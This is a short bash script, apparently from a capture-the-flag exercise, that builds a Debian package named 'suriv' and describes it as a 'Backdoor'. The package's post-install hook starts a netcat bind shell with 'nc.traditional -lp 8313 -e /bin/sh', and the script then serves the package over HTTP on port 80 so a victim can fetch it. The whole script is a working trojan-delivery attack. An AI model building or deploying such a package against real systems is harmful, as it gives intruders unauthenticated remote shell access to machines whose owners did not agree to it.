#!/usr/bin/bash -x
PACKAGE='suriv'
WEBPATH='html/pub/jfrost/backdoor'
PKGLIST=`ls debs`
INSTPATH='/var/spool/deb-packages'
# Structure the package 
mkdir $PACKAGE
mkdir ${PACKAGE}/DEBIAN
cat >${PACKAGE}/DEBIAN/control <<EOL
Package: ${PACKAGE}
Version: 1.0
Section: custom
Priority: optional
Architecture: amd64
Essential: no
Installed-Size: 1024
Maintainer: Not Jack Frost
Description: Backdoor
EOL
mkdir -p ${PACKAGE}${INSTPATH}
cp debs/* ${PACKAGE}${INSTPATH}
cat >${PACKAGE}/DEBIAN/postinst <<EOL
PKG_LIST=\`ls ${INSTPATH}\`
for p in \$PKG_LIST
do
  apt install ${INSTPATH}/\$p
done
/bin/nc.traditional -lp 8313 -e /bin/sh &
EOL
chmod -R 0755 ${PACKAGE}/DEBIAN
# Create the deb package
dpkg-deb --build ${PACKAGE}
#copy it to the expected path
mkdir -p ${WEBPATH}
cp ${PACKAGE}.deb ${WEBPATH}/${PACKAGE}_amd64.deb
#start the webserver
cd html
python3 -m http.server 80
